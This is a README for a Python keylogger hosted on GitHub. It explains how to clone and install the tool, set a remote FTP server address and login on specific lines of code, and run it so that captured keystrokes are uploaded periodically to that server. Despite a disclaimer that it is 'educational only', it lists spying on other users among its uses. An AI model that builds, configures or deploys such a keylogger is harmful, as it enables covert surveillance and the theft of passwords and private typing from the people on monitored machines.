## Keylogger 🖥️🔍

This is a straightforward keylogger crafted with the Python Keyboard library That uploads the log file to a remote **FTP** server .

This keyloggers are simple and barebones, yet they work like a charm! Feel free to fork and enhance it if you wish. 🍴✨



## Warning ⚠️☠️

**This project is intended for educational and research purposes only.**

Please use this keylogger responsibly and only on devices and systems for which you have explicit authorization.

The author(s) of this project are not responsible for any misuse or illegal activities involving this software.


## Installation Process 📥

First, clone the repository and navigate to the Keylogger directory:

```
$ git clone https://github.com/Advaidv121/Keylogger && cd Keylogger
```

Next, install Keylogger using pip3 with the following instructions:

```
$ pip install -r requirements.txt
```
## Pre Execution ⏮️

On line number **36** add the necessary ftp address for the log file to be uploaded into the ftp server
```
36. ftp=FTP('xx.xxx.xx.xx') #replace 'xx.xxx.xx.xx'
```
On line number **37** add the necessary username and password to login into the ftp server for upload
```
37. ftp.login('username','password')  #replace 'username' 'password'
```

## Execution 🏃‍♂️

Kickstart the keylogger by running 
```
python keylogger.py
```
It'll start logging your keystrokes immediately! ⌨️📝
And starts logging the log files into the **ftp** server based on the desired time interval🛜

## Potential Uses 💡

Keyloggers can be used for:

- Personal Control and File Backup: Ensure no one is using your computer in your absence. 🔒💼
- Self Analysis: Verify if your system is being accessed by someone else. 🕵️‍♂️💻
- Malicious Intent: Spy on other systems and users (Not recommended). 👀🚫"
